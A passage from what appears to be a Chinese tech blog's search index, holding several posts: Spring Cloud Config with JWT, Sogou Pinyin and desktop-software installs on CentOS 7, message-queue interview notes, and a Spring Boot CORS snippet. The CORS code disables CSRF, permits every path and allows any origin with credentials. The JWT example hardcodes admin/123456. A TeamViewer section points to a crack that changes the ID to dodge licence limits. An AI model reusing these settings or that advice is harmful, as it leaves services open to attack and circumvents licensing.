claims) { return Jwts.builder().setClaims(claims).setExpiration(generateExpirationDate()) .signWith(SignatureAlgorithm.HS512, secret).compact(); } private Date generateExpirationDate() { return new Date(System.currentTimeMillis() + expiration * 1000); } public String getUsernameFromToken(String token) { if (token == null) { return null; } String username; try { final Claims claims = getClaimsFromToken(token); username = claims.getSubject(); } catch (Exception e) { username = null; } return username; } private Claims getClaimsFromToken(String token) { Claims claims; final String tokenClean = token.substring(7); // remove "Bearer:" try { claims = Jwts.parser().setSigningKey(secret).parseClaimsJws(tokenClean).getBody(); } catch (Exception e) { claims = null; } return claims; } /** * 校验token的合法性 * * @param token * @param userDetails * @return */ public Boolean validateToken(String token, UserDetails userDetails) { JwtUser user = (JwtUser) userDetails; final String username = getUsernameFromToken(token); return (username.equals(user.getUsername()) &amp;&amp; !isTokenExpired(token)); } private Boolean isTokenExpired(String token) { final Date expiration = getExpirationDateFromToken(token); return expiration.before(new Date()); } public Date getExpirationDateFromToken(String token) { Date expiration; try { final Claims claims = getClaimsFromToken(token); expiration = claims.getExpiration(); } catch (Exception e) { expiration = null; } return expiration; }} 创建 Config Server 工程里的 JWT 认证端点类，主要用于在认证过程中，若认证未能通过直接返回 401 状态码： 123456789@Componentpublic class JwtAuthenticationEntryPoint implements AuthenticationEntryPoint, Serializable { @Override public void commence(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, AuthenticationException e) throws IOException, ServletException { // 没有认证通过将添加401 httpServletResponse.sendError(HttpServletResponse.SC_UNAUTHORIZED, "Unauthorized"); }} 创建 Config Server 工程里的账号验证类，主要用于客户端的验证用户名和密码： 12345678910111213141516171819202122232425@Servicepublic class MemberServiceImpl implements UserDetailsService { private static final PasswordEncoder BCRYPT = new BCryptPasswordEncoder(); @Value("${spring.security.user.name}") private String hardcodedUser; @Value("${spring.security.user.password}") private String password; @Override public JwtUser loadUserByUsername(String username) throws UsernameNotFoundException { // 对密码进行加密 String hardcodedPassword = BCRYPT.encode(password); if (username.equals(hardcodedUser) == false) { throw new UsernameNotFoundException(String.format("No user found with username \'%s\'.", username)); } else { SimpleGrantedAuthority simpleGrantedAuthority = new SimpleGrantedAuthority("ROLE_USER"); List&lt;GrantedAuthority&gt; grantedAuthorityList = new ArrayList&lt;GrantedAuthority&gt;(); grantedAuthorityList.add(simpleGrantedAuthority); return new JwtUser(hardcodedUser, hardcodedPassword, grantedAuthorityList); } }} 创建 Config Server 工程的 WebAuthenticationDetailsSourceImpl 类，用于将传递过来的对象数据封装到 JwtAuthenticationRequest 里面，该类负责将数据封装成 JSON 格式后返回给客户端： 12345678910111213141516171819202122232425@Componentpublic class WebAuthenticationDetailsSourceImpl implements AuthenticationDetailsSource&lt;HttpServletRequest, JwtAuthenticationRequest&gt; { @Override public JwtAuthenticationRequest buildDetails(HttpServletRequest request) { Gson gson = new Gson(); String json = new String(); String output = new String(); BufferedReader br; StringBuffer buffer = new StringBuffer(16384); JwtAuthenticationRequest jwtAuthenticationRequest = new JwtAuthenticationRequest(); try { br = new BufferedReader(new InputStreamReader(request.getInputStream())); while ((output = br.readLine()) != null) { buffer.append(output); } json = buffer.toString(); jwtAuthenticationRequest = gson.fromJson(json, JwtAuthenticationRequest.class); } catch (IOException e) { e.printStackTrace(); } return jwtAuthenticationRequest; }} 创建 Config Server 工程的 AuthenticationRestController 类，主要用于颁发 Token 给客户端： 1234567891011121314151617181920212223242526272829@RestControllerpublic class AuthenticationRestController { @Autowired private AuthenticationManager authenticationManager; @Autowired private JwtTokenUtil jwtTokenUtil; @Autowired private MemberServiceImpl userDetailsService; @Autowired private WebAuthenticationDetailsSourceImpl webAuthenticationDetailsSource; @RequestMapping(value = "/auth", method = RequestMethod.POST) public ResponseEntity&lt;?&gt; createAuthenticationToken(HttpServletRequest request) { JwtAuthenticationRequest jwtAuthenticationRequest = webAuthenticationDetailsSource.buildDetails(request); UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(jwtAuthenticationRequest.getUsername(), jwtAuthenticationRequest.getPassword()); authToken.setDetails(jwtAuthenticationRequest); Authentication authenticate = authenticationManager.authenticate(authToken); SecurityContextHolder.getContext().setAuthentication(authenticate); JwtUser userDetails = userDetailsService.loadUserByUsername(jwtAuthenticationRequest.getUsername()); final String token = jwtTokenUtil.generateToken(userDetails); return ResponseEntity.ok(new JwtAuthenticationResponse(token)); }} 创建 Config Server 工程的 SecurityConfig 类，主要作用是进行安全认证和 Token 的过滤： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960@Configuration@EnableWebSecurity@EnableGlobalMethodSecurity(prePostEnabled = true)public class SecurityConfig extends WebSecurityConfigurerAdapter { @Autowired private JwtAuthenticationEntryPoint unAuthorizedHandler; @Autowired private WebAuthenticationDetailsSourceImpl webAuthenticationDetailsSource; @Bean @ConditionalOnMissingBean(AuthenticationManager.class) public UsernamePasswordAuthenticationFilter usernamePasswordAuthenticationFilter(AuthenticationManager authenticationManager) throws Exception { UsernamePasswordAuthenticationFilter usernamePasswordAuthenticationFilter = new UsernamePasswordAuthenticationFilter(); usernamePasswordAuthenticationFilter.setAuthenticationManager(authenticationManager); usernamePasswordAuthenticationFilter.setAuthenticationDetailsSource(webAuthenticationDetailsSource); return usernamePasswordAuthenticationFilter; } @Bean public PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); } @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { return super.authenticationManagerBean(); } @Bean public JwtAuthenticationTokenFilter authenticationTokenFilter() throws Exception { JwtAuthenticationTokenFilter jwtAuthenticationTokenFilter = new JwtAuthenticationTokenFilter(); jwtAuthenticationTokenFilter.setAuthenticationManager(authenticationManager()); jwtAuthenticationTokenFilter.setAuthenticationDetailsSource(webAuthenticationDetailsSource); return jwtAuthenticationTokenFilter; } @Override protected void configure(HttpSecurity httpSecurity) throws Exception { httpSecurity .csrf().disable() .exceptionHandling().authenticationEntryPoint(unAuthorizedHandler) .and() .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() .authorizeRequests() .antMatchers(HttpMethod.GET, "/").permitAll() .antMatchers("/auth/**").permitAll() .anyRequest().authenticated().and().formLogin() .authenticationDetailsSource(webAuthenticationDetailsSource) .permitAll(); // 添加自定义的jwt安全过滤的filter httpSecurity.addFilterBefore(authenticationTokenFilter(), UsernamePasswordAuthenticationFilter.class); httpSecurity.headers().cacheControl(); }} iiii. 创建 Config Client 工程这里的 Config Client 工程与上面 “客户端回退” 示例中的 Config Client 工程的代码一致，直接拷贝一份即可，这里不再累述。 Config Client 里的 pom.xml 文件，引入上面的 config-client-jwt 依赖： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-client-jwt&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; Config Client 里的 application.yml 配置文件： 123spring: application: name: config-client Config Client 里的 bootstrap.yml 配置文件，其中 password 和 username 是 Config Server 端配置需要的认证用户信息，endpoint 是一个 Config Server 访问验证授权的地址： 1234567891011spring: cloud: config: name: config-client #需要从远程Git仓库读取的配置文件的名称，注意没有"yml"文件后缀，可以写多个，通过逗号隔开 profile: dev #本次访问的配置项 label: master #Git分支的名称 uri: http://127.0.0.1:8001 #Config Server的地址 username: admin password: 123456 enabled: false endpoint: http://localhost:8001/auth #指定JWT的认证地址 iiiii. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9090/getConfigInfo，接口会返回 I am the git configuration file from dev environment，说明一切运行正常 config-client 特意填写错误的账号信息，然后重新启动 config-client 应用，观察控制台是否会出现 401 授权失败的错误 下篇 - Config 入门教程（高级篇） Config 入门教程 - 高级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Centos7 安装搜狗输入法",url:"/posts/26aba73.html",text:'前言 本教程只适用于 Centos7 安装搜狗输入法（v2.2.0.0108），支持的桌面环境是 GNOME。注：文章末尾附有搜狗输入法最终的运行效果图 系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 安装 Fcitx 输入法框架 12345678910111213141516171819202122# 关闭ibus输入法，绝对不能使用“yum remove ibus”命令卸载ibus, 否则会将桌面环境一同卸载掉# mv /usr/bin/ibus-daemon /usr/bin/ibus-daemon.bak# 安装fcitx# yum install libQtWebKit* fcitx fcitx-libs fcitx-qt4 fcitx-qt5 fcitx-configtool fcitx-table fcitx-table-chinese# 如果上面的fcitx-qt5因依赖关系无法安装，则可以安装qt5-qtbase来替代# yum install qt5-qtbase# 配置环境变量（主要是为了解决GTK/Qt程序无法切换输入法）# vim /etc/profileexport XIM=fcitxexport GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport QT4_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx"# 重启系统使环境变量生效，并关闭ibus# reboot# 查看fcitx的安装状态（使用普通用户身份运行），重点查看红色部分（错误）的日志信息$ fcitx-diagnose 安装搜狗输入法 12345678910111213141516171819202122232425262728# 安装alien# yum install alien# 下载deb包# wget http://cdn2.ime.sogou.com/dl/index/1524572264/sogoupinyin_2.2.0.0108_amd64.deb?st=EPtVkvlW9rLVsn-jtfOGbA&amp;e=1568569239&amp;fn=sogoupinyin_2.2.0.0108_amd64.deb# 转换rpm包# alien -r sogoupinyin_2.2.0.0108_amd64.deb# 安装搜狗输入法# rpm -ivh --force sogoupinyin-2.2.0.0108-2.x86_64.rpm# 拷贝库文件# cp -R /usr/lib/x86_64-linux-gnu/fcitx/* /usr/lib64/fcitx/# 库文件授权# chmod -R 755 /usr/lib64/fcitx/# 启动fcitx$ fcitx# 开机自启动fcitx# 导航到应用程序 --&gt; 附件 --&gt; 优化工具 --&gt; 开机启动程序，设置fcitx为开机自启动# 配置fcitx，添加搜狗输入法$ fcitx-configtool# 提示：fcitx成功添加搜狗输入法后，正常情况下可以通过快捷键ctrl + 空格调出搜狗输入法 (adsbygoogle = window.adsbygoogle || []).push({}); 解决搜狗输入法无法运行或者切换失败的问题 1234567891011121314# 一般是sogou-qimpanel启动失败导致，首先删除搜狗输入法的相关配置文件，然后重启搜狗输入法或者重启系统$ rm -rf ~/.config/SogouPY$ rm -rf ~/.config/SogouPY.users$ rm -rf ~/.config/sogou-qimpanel# 重启fcitx与搜狗输入法（杀死下面的应用进程后，由于存在守护进程的缘故，应用进程会自动重启）$ killall fcitx$ killall sogou-qimpanel# 如果搜狗输入法还是无法正常运行，尝试设置GNOME的注册表（或者使用dconf-editor可视化工具来设置注册表），设置完之后重启系统$ gsettings set org.gnome.settings-daemon.plugins.xsettings overrides "{\'Gtk/IMModule\':&lt;\'fcitx\'&gt;}"# 如果上述方法都无法解决，那么可查看fcitx的错误日志信息来排查问题$ cat ~/.config/fcitx/log/crash.log 安装其他输入法（可选操作，未验证） 1234567891011# 标准拼音输入法# yum install fcitx-pinyin# 中州韵输入法# yum install fcitx-rime fcitx-cloudpinyin# 谷歌拼音输入法# yum install fcitx-googlepinyin fcitx-cloudpinyin# sunpinyin输入法# yum install fcitx-sunpinyin sunpinyin-data fcitx-cloudpinyin 新增输入法的皮肤（可选操作） 12345678910111213# fcitx经典皮肤的目录路径# /usr/share/fcitx/skin# ~/.config/fcitx/skin# sogou-qimpanel皮肤的目录路径# /usr/share/sogou-qimpanel/skin# 搜狗全平台通用ssf格式皮肤的目录路径# /usr/share/sogou-qimpanel/recommendSkin/skin# ~/.config/sogou-qimpanel/skin# 搜狗输入法皮肤下载：https://pinyin.sogou.com/skins/# 提示：可从搜狗输入法官网下载新皮肤到上述对应的目录下（区分Linux用户），目前非Ubuntu系的Linux发行版跟搜狗输入法的皮肤(sff格式)不兼容，实测Centos7无法正常使用搜狗输入法的皮肤安装功能 新增搜狗输入法词库（可选操作） 123456789101112131415161718192021# 下载词库（https://pinyin.sogou.com/dict/）$ wget http://download.pinyin.sogou.com/dict/download_cell.php?id=22408&amp;name=电视剧名大全# 拷贝词库文件$ cp 电视剧名大全.scel ~/.config/SogouPY/scd# 重命名词库文件，格式为：数字.scel$ mv ~/.config/SogouPY/scd/电视剧名大全.scel ~/.config/SogouPY/scd/15279.scel# 编辑词库配置文件，添加以下内容（其中scd的序号必须唯一，id必须与词库的文件名一致）$ vim ~/.config/SogouPY/scdlist.ini[scd4]id=15279name=电视剧名大全type=电视剧名大全# 重启fcitx与搜狗输入法（杀死下面的应用进程后，由于存在守护进程的缘故，应用进程会自动重启）$ killall fcitx$ killall sogou-qimpanel# 导航到搜狗输入法 --&gt; 设置 --&gt; 词库，如果成功添加词库，那么界面上会显示新添加的词库类型 使用 im-chooser 切换输入法（可选操作，不建议） 12345678910111213# 仅供参考，亲测Centos7环境下不一定能保证切换成功；当fcitx安装成功，并添加了搜狗输入法，那么正常情况下可以通过快捷键ctrl + shift来切换不同的输入法# 安装im-chooser# yum install im-chooser# 切换输入法为fcitx$ imsettings-switch fcitx# 如果无法切换至指定的输入法，可以查看imsettings的日志来排查问题$ cat ~/.cache/imsettings/log# 检查imsettings设置$ imsettings-info 最终效果图 参考博客 Centos7.2 安装搜狗拼音 Sogou Pinyin 安装过程常见的问题 CentOS 7 输入中文 &amp; 安装搜狗输入法 Fedora20 安装搜狗输入法及各种问题的解决 Fedora 29/30 安装 FCITX 输入法 + Rime / 拼音 非 Ubuntu 系发行版跟搜狗输入法的皮肤不兼容 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"消息队列面试题之一",url:"/posts/f7fd0987.html",text:'消息积压消息积压概述消息的积压来自于两方面：要么发送快了，要么消费变慢了 监控发现，生产和消费消息的速度没什么变化，出现消息积压的情况，检查是有消费失败反复消费的情况。 监控发现，消费消息的速度变慢，检查消费实例，日志中是否有大量消费错误、消费线程是否死锁、是否卡在某些资源上。 单位时间内发送的消息增多，比如赶上大促或者抢购，短时间内不太可能优化消费端的代码来提升消费性能，但可以通过扩容消费端的实例数来提升总体的消费能力。 如果短时间内没有服务器资源扩容，可以将系统降级，通过关闭某些不重要的业务，减少消息发送的数据量，最低限度让系统还能正常运转，保证核心业务的可用性。 严重影响 QM 甚至整个系统时，可以考虑临时启用多个消费者，并发接受消息，持久化之后回头让生产者重新生产消息，或者极端情况下直接丢弃消息。 消息积压扩容方案利用临时消费者，消费原来积压队列中的消息。该消费者不做任何耗时的操作，将消息均匀写入新创建的队列里，最后将更多 Consumer 部署到更多的机器上消费新创建队列上的消息。等待积压的消息被消费，恢复到正常状态，撤掉扩容服务器。具体步骤和思路如下： 先修复 Consumer 的问题，确保其恢复正常的消费速度，然后将现有 Consumer 都停止 临时建立好原先 10 倍或者 20 倍的 Queue 数量 写一个临时的分发数据的 Consumer 程序，这个程序部署上去消费积压的数据，消费之后不做耗时的处理，直接均匀轮询写入临时建立好的 10 倍数量的 Queue 接着临时征用 10 倍机器来部署 Consumer，每一批 Consumer 消费一个临时 Queue 的数据 这种做法相当于临时将 Queue 资源和 Consumer 资源扩大了 10 倍，即以正常的 10 倍速度消费积压的消息，扩容前后如下图所示： 消息积压真实场景场景一：大量消息积压，并且设置了过期时间 假设用的是 RabbitMQ，由于 RabbitMQ 是可以设置过期时间的（TTL），如果消息在 Queue 中积压超过一定的时间，就会被 RabbitMQ 清理掉。这个时候就不是消息被大量积压的问题，而是大量的消息被直接搞丢了。这种情况下，就不是说要增加 Consumer 消费积压的消息，因为实际上消息是没有积压的，而是丢了大量的消息，此时可以采取的一个方案就是批量重导。当大量的消息积压的时候，由于设置了过期时间，RabbitMQ 会直接丢弃数据，然后等业务高峰期过了之后，例如在晚上 12 点以后，写个临时程序将丢失的那批数据查询出来，然后重新将消息写入 RabbitMQ 里，即把白天丢的消息全部补回来。假设 10000 个订单积压在 RabbitMQ 里面，没有来得及处理掉，其中 2000 个订单都丢了，那么只能手动写个临时程序把那 2000 个订单查询出来，然后手动发送消息到 RabbitMQ 中重新进行消费。 场景二：大量消息积压，导致 MQ 磁盘满了 消息积压在 MQ 里，那么如果很长时间都没有处理掉，此时导致 MQ 都快写满了，那应该怎么办？这个时候可以写一个临时程序，启用多个消费者，并发接受消息，同时持久化消息，即快速消费掉 MQ 中积压的消息。到凌晨的时候，将持久化的消息重新写回 MQ 中进行消费；如果希望加快已持久化消息的消费速度，可以引入上述的消息积压扩容方案。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"SpringBoot 常用代码块",url:"/posts/f023325d.html",text:'跨域SpringBoot + Security 跨域12345678910111213141516171819202122232425262728293031323334353637import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.security.config.annotation.web.builders.HttpSecurity;import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;import org.springframework.web.cors.CorsConfiguration;import org.springframework.web.cors.UrlBasedCorsConfigurationSource;import org.springframework.web.filter.CorsFilter;/** * Web 安全配置 */@Configurationpublic class WebSecurityConfig extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.cors().and().csrf().disable().authorizeRequests().antMatchers("/**").permitAll(); } /** * 允许跨域 * * @return */ @Bean public CorsFilter corsFilter() { UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); CorsConfiguration corsConfiguration = new CorsConfiguration(); corsConfiguration.addAllowedOrigin("*"); corsConfiguration.addAllowedHeader("*"); corsConfiguration.addAllowedMethod("*"); corsConfiguration.setAllowCredentials(true); source.registerCorsConfiguration("/**", corsConfiguration); return new CorsFilter(source); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 开发随笔"},{title:"Centos7 安装常用桌面软件",url:"/posts/3f15d076.html",text:'前言 本文主要介绍 Centos7 如何安装微信客户端、网易云音乐、百度网盘、TeamViewer、Rhythmbox 等桌面软件。 添加 YUM 源 添加 epel，nux-dextop，rpmfusion 源，可参考本站教程：Centos7 管理 YUM 源 electronic-wechat 微信客户端 electronic-wechat 是一款基于 Web 版微信开发的第三方微信客户端，自带消息防撇回功能。由于 Web 版的微信会限制新注册的微信账号登录，因此 electronic-wechat 同样不支持微信新账号登录。该项目由于各种原因已经停止维护，但并不影响正常使用，实测使用非常稳定。 electronic-wechat github electronic-wechat releases 123456789101112131415161718192021222324252627282930# 进入安装目录# cd /usr/local# 下载已编译的安装包$ wget https://github.com/kooritea/electronic-wechat/releases/download/v2.3.1/electronic-wechat-linux-x64-2.3.1.zip# 解压文件# unzip electronic-wechat-linux-x64-2.3.1.zip# 删除文件# rm -rf electronic-wechat-linux-x64-2.3.1.zip# 文件授权# chown -R peter:peter electronic-wechat-linux-x64# 使用普通用户身份运行应用（可以使用快捷键ctrl + c退出程序）$ ./electronic-wechat-linux-x64/electronic-wechat# 创建应用菜单栏的快捷方式# vim /usr/share/applications/electronic-wechat.desktop[Desktop Entry]Name=Electronic WechatComment=Unofficial WeChat client built with React, MobX and Electron.Exec=/usr/local/electronic-wechat-linux-x64/electronic-wechat %UIcon=/usr/local/electronic-wechat-linux-x64/assets/icon.pngTerminal=falseType=ApplicationCategories=Network;Chat;# 导航到：应用程序 --&gt; 互联网 --&gt; Electronic Wechat，直接点击快捷方式启动应用，效果图如下 (adsbygoogle = window.adsbygoogle || []).push({}); 网易云音乐 建议直接使用 Snap 或者 Flatpak 安装网易云音乐，网上解压 deb 包的安装方法大多数无法安装成功，主要是相关依赖不容易安装导致。下面主要介绍如果通过 Snap 安装网易云音乐，其中 Snap 的安装可参考本站教程，Snap 安装完成后执行以下步骤安装网易云音乐即可，整个安装过程非常简单，以后管理应用也很方便。 123456789101112131415161718192021222324# 安装网易云音乐（Snap的下载速度较慢，耐心等待安装完成即可）# snap install netease-music --devmode --beta# 查看安装状态# snap list# 创建快捷方式# vim /usr/share/applications/netease-music.desktop[Desktop Entry]Type=ApplicationName=Netease-musicGenericName=Netease-musicComment=Music player for netease cloud musicCategories=AudioVideo;Player;RecorderKeywords=musicExec=/snap/bin/netease-musicIcon=/var/lib/snapd/snap/netease-music/current/snap/gui/icon.pngTerminal=falseStartupNotify=true# 导航到：应用程序 --&gt; 影音 --&gt; Netease-music，直接点击快捷方式启动应用，效果图如下# 或者直接执行命令（使用普通用户权限）$ /snap/bin/netease-music 百度网盘 2019 年 6 月份，百度网盘宣布支持 Linux 平台，官网显示适配中标麒麟桌面操作系统（兆芯版）V7.0 与 Ubuntu V18.04；目前提供 rpm 和 deb 包下载，官方下载地址可以点这里。 123456789101112# 下载# http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/2.0.2/baidunetdisk_linux_2.0.2.rpm# 安装# rpm -ivh baidunetdisk_linux_2.0.2.rpm# 导航到：应用程序 --&gt; 互联网 --&gt; baidunetdisk，直接点击快捷方式启动应用，效果图如下# 提示：# 默认安装位置：/opt/baidunetdisk# 用户配置文件位置：~/baidunetdisk# 默认下载位置：~/baidunetdiskdownload TeamViewer TeamViewer：功能齐全的完整版本，拥有该系列软件的全部功能，既可以当作服务器端供其他人进行连接，也可以当作控制端连接其它作为终端的服务器端。 TeamViewer Host：一个去除了控制端功能的简化版本，它的用途就是将电脑设置为一个可供其他人随时进行连接的服务器端系统，支持在不限数量的计算机和设备上安装。 提示：上述两个版本不支持同时安装，其中两者的安装都需要依赖 EPEL 源，如果仅需要提供 Centos 宿主机给其他人远程访问，推荐只安装 TeamViewer Host，官方下载地址，官方中文安装教程。 12345678910111213141516171819# 导入公钥避免签名验证失败（非必需步骤）# wget https://dl.teamviewer.cn/download/linux/signature/TeamViewer2017.asc# rpm --import TeamViewer2017.asc# 下载TeamViewer（RPM包区分32位与64位系统）# wget https://dl.teamviewer.cn/download/linux/version_14x/teamviewer_14.6.2452.x86_64.rpm# 安装TeamViewer# yum install ./teamviewer_14.6.2452.x86_64.rpm# 查看TeamViewer服务的管理命令# teamviewer help# 导航到：应用程序 --&gt; 互联网 --&gt; TeamViewer 14，直接点击快捷方式启动应用，应用启动后的效果图如下# 如果需要卸载TeamViewer，可执行以下命令# yum remove teamviewer# 默认安装位置：/opt/teamviewer 12345671. TeamViewer Linux版的许可证类型默认为免费，当远程操作超过一定次数或时间，软件便会提示当前行为商业用途或者试用版到期，最后会被限制连接使用2. 突破TeamViewer的商业限制，可以尝试更改TeamViewer的ID（通常根据MAC地址生成ID），可参考以下方法更改TeamViewer的IDhttps://github.com/lyz8jj0/mac-teamviewer-crack/blob/master/TeamViewer-id-changer.py%20https://askubuntu.com/questions/423314/how-to-change-teamviewer-id-after-cloning3. 或者使用frp + mstsc(windows) + vnc(unix/linux)方案替代TeamViewer Rhythmbox 音乐播放器 rhythmbox wiKi rhythmbox github rhythmbox third party plugins 1234567891011121314# 安装播放器# yum install rhythmbox# 安装播放器插件# yum install gstreamer-ffmpeg# yum install gstreamer-plugins-bad# yum install gstreamer-plugins-ugly# 恢复播放器默认设置$ rm -rf ~/.cache/rhythmbox$ rm -rf ~/.gconf/apps/rhythmbox$ rm -rf ~/.local/share/rhythmbox# 在Gnome-Shell中，Rhythmbox应用程序的配置菜单位于活动菜单选项旁边的顶栏，应用启动后的效果图如下 参考博客 海量的超赞 Linux 软件 哪个 Linux 发行版的软件资源最多？ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"Config 入门教程 - 基础篇",url:"/posts/9de3ccde.html",text:'配置中心介绍什么是配置中心在集中式开发时代，配置文件已经基本足够了，因为那时配置的管理通常不会成为一个很大的问题。但是在互联网时代，应用都是分布式系统，部署在 N 台服务器上，想要去线上一台台地重启机器肯定不靠谱，并且维护成本也很高，所以配置中心应运而生。配置中心被用作集中管理不同环境（Dev、Test、Stage、Prod）和不同集群配置，以及在修改配置后将实时动态推送到应用上进行刷新。配置中心应具备的功能如下： Open API 业务无关性 高可用集群 配置生效监控 配合灰度与更新 一致性 K-V 存储 统一配置实时推送 配置全局恢复、备份与历史 主流配置中心对比 Spring Cloud Config、Apollo、Nacos 对比图 Spring Cloud Config、Netflix Archaius、Apollo、Disconf（已停止维护） 对比图 Config 配置中心概述Spring Cloud Config 是一个集中化外部配置的分布式系统，由服务端和客户端组成。它不依赖于注册中心，是一个独立的配置中心。Spring Cloud Config 支持多种存储配置信息的形式，目前主要有 JDBC、Vault、Native、SVN、Git，其中默认为 Git 存储形式，Git 版的工作原理如下图： 配置中心流转与整体支持图 Config 入门案例1. 版本说明在本文中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，特别声明除外，点击下载完整的案例代码。 2. 准备工作由于下面的 Spring Cloud Config 使用 Git 作为存储方式，因此需要提前在 Git 远程仓库（Github、Gitlab）中创建对应的仓库，然后往仓库里 Push 三个配置文件，分别是 config-client-dev.yml、config-client-prod.yml、config-client-test.yml，配置文件的内容如下： 123456server: port: 9001cn: springcloud: config: I am the git configuration file from dev environment 123456server: port: 9002cn: springcloud: config: I am the git configuration file from prod environment 123456server: port: 9003cn: springcloud: config: I am the git configuration file from test environment 3. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 4. 创建 Config Server 工程创建 Config Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-config-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Server 的主启动类，增加 @EnableConfigServer 注解： 